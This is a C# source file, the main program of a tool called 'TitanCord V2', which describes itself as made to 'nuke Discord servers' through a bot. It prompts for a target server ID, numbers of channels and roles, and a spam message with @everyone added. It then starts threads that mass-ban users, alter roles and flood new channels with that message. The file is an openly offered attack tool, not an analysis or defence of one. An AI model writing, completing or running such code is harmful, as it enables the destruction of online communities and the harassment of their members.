using System.Diagnostics;

public class Program
{
    private static TitanCordManager _titanCordManager;

    public static void Main()
    {
        Console.Title = "TitanCord V2 | Made by https://github.com/ZygoteCode/";
        Process.GetCurrentProcess().PriorityClass = ProcessPriorityClass.RealTime;

        TitanCordGlobals.SetBotToken(File.ReadAllText("token.txt"));
        _titanCordManager = new TitanCordManager();

        string guildId = "", message = "", channels = "", roles = "";

        TitanCordUtils.Log("PRESENTATION", "TitanCord V2 - Credits to https://github.com/ZygoteCode/");
        TitanCordUtils.Log("PRESENTATION", "Welcome to TitanCord! With this fantastic tool, made to be supported in 2025, you can nuke Discord servers using your created Bot!");
        TitanCordUtils.Log("PRESENTATION", "REMEMBER: you must put your Discord BOT Token in the file called \"token.txt\" in this folder to make the program working! If you have not done that, please, do that now and restart the application!");
        Console.WriteLine();

        while (!TitanCordUtils.IsGuildIdValid(guildId))
        {
            TitanCordUtils.Log("REQUEST", "lease, insert the Guild ID of the server to nuke here:");
            guildId = Console.ReadLine();

            if (!TitanCordUtils.IsGuildIdValid(guildId))
            {
                TitanCordUtils.Log("ERROR", "Invalid inserted Guild ID. Please, try again with another value.");
            }
        }

        while (!TitanCordUtils.IsNumberValid(channels))
        {
            TitanCordUtils.Log("REQUEST", "Please, insert the numeric amount of text channels to create:");
            channels = Console.ReadLine();

            if (!TitanCordUtils.IsNumberValid(channels))
            {
                TitanCordUtils.Log("ERROR", "Invalid inserted number of channels. Please, try again with another value.");
            }
        }

        while (!TitanCordUtils.IsNumberValid(roles))
        {
            TitanCordUtils.Log("REQUEST", "Please, insert the numeric amount of roles to create:");
            roles = Console.ReadLine();

            if (!TitanCordUtils.IsNumberValid(roles))
            {
                TitanCordUtils.Log("ERROR", "Invalid inserted number of roles. Please, try again with another value.");
            }
        }

        while (!TitanCordUtils.IsTextMessageValid(message))
        {
            TitanCordUtils.Log("REQUEST", "Please, insert the textual message to send in every text channel created (do not worry, @everyone is automatically added):");
            message = Console.ReadLine();

            if (!TitanCordUtils.IsTextMessageValid(message))
            {
                TitanCordUtils.Log("ERROR", "Invalid inserted text message. Please, try again with another value.");
            }
        }

        TitanCordUtils.Log("INFORMATION", "The NUKE attack has been started!");

        Thread banThread = new Thread(() =>
        {
            TaskBanUsers.DoTask(guildId, _titanCordManager);
        });

        banThread.Priority = ThreadPriority.Highest;
        banThread.Start();

        Thread roleThread = new Thread(() =>
        {
            TaskModifyRoles.DoTask(guildId, _titanCordManager, roles);
        });

        roleThread.Priority = ThreadPriority.Highest;
        roleThread.Start();

        Thread channelThread = new Thread(() =>
        {
            TaskModifyChannels.DoTask(guildId, _titanCordManager, channels, message);
        });

        channelThread.Priority = ThreadPriority.Highest;
        channelThread.Start();

        while (true)
        {
            Console.ReadLine();
        }
    }
}